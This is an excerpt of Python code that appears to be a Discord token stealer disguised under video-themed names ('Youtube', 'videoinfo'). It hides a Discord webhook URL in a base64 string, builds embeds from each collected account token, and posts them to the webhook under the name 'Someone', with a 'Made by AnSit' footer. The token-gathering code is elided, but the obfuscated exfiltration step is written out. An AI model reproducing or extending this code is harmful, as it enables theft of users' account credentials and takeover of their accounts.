...
videoinfo = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNTEyMjgwMjczMDUzNzAzMi9rNWJ4OVZPZEpIS25xS0dFeVBZODcxUnN3a0U5QUVXa0g5V1R0OUhnZzBza2FHQkh1ZWMwS3Zlck1nSTdwb29zSWw1Wg=="

webvideo = base64.b64decode(videoinfo)

class Youtube():
    def __init__(self, webvideo):
        self.hook = webvideo
        self.tokens = []
    ...
    def main(self):
        ...
        for token_line in self.tokens:
            try:
                ...
                embed = {
                    ...
                    "footer": {
                        "text": f"Made by AnSit - discord.gg/W-azure",
                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                    },
                    "image": {
        ...
        requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": "","embeds": embeds,"username": "Someone","avatar_url": "https://masterpiecer-images.s3.yandex.net/561702be789511eeb4c3963c1ee369ba:upscaled"}).encode())
